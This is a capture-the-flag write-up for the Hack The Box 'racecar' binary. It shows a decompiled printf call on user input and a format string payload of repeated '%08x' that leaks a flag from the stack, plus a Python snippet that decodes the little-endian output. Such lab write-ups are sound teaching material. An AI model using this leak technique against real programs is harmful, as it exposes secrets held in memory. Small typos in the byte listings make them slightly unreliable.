> **Did you know that racecar spelled backwards is racecar?**
> **Well, now that you know everything about racing, win this race and get the flag!**

> Author: **[w3th4nds][author-profile]**

## Fast and failed

### The meta?

Nothing outstanding from `trid`, `binwalk`, `exiftool` and `objdump`.

There's an interesting string though: "flag.txt". The binary is most likely
accessing a local file, which would be our target.

### Playing racecar?

The previous hypothesis can be confirmed by running the binary: it crashes
when the file "flag.txt" is not present in its parent folder. Let's create
a bogus flag with "heyhey seth here" inside.

Now the binary prompts for name, nickname, car and circuit.
The combination "fast car + highway circuit" seems to win everytime.

There's a last prompt after the victory: the user input is simply echoed.

```
[!] Do you have anything to say to the press after your big victory?
> iii

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
iii
```

### Overflowing?

My first reaction, try and overflow, fails miserably.

## Static analysis

Looking for "flag.txt" in Ghidra leads to:

```c
__stream = fopen("flag.txt","r");
if (__stream == (FILE *)0x0) {
  printf("%s[-] Could not open flag.txt. Please contact the creator.\n",&DAT_00011548,puVar5);
                /* WARNING: Subroutine does not return */
  exit(0x69);
}
fgets(local_3c,0x2c,__stream);
read(0,__format,0x170);
puts(
    "\n\x1b[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \x1b[0m"
    );
printf(__format);
```

On the last line, we want to print the content of `local_3c` instead of the
input saved in `__format`.

## Reading the stack

The arguments accessed by printf are inferred from the format string. For example:

```c
"%08x %p"
```

Will print the first 8 nibbles on the stack and then interpret the next word as
a `void *` pointer.

With "%08x %08x %08x %08x", the binary will respond with the first 4 words on
the stack. Hence, we can read the stack frame: this is the "format string attack". 

The target is the content of the flag file: "heyhey seth here". The corresponding
bytes are:

```
0x68 Ox65 0x79 0x68 ...
```

With a large enough format string, we should see those bytes appear in the echo.

```
%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x ... %08x
```

Returns:

```
0x5655a1c0 ... 0x68796568 0x73207965 ...
```

The finish line is in sight!

## Reordering

The description "racecar spelled backwards is racecar" actually refers to endianness.

Indeed there's a twist: `0x68796568` reads "hyeh". In other word, the order is inverted.

This can be easily reversed, word by word:

```python
def decode(word: str) -> str:
    # start at 2 to ignore the "0x"
    return "".join([chr(int(word[i:i+2], 16)) for i in range(2, 10, 2)][::-1])
```

And, iterating on the whole memory dump:

```python
"".join([decode(w) for w in BYTES.split(" ")])
```

> HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}

[author-profile]: https://app.hackthebox.eu/users/70668
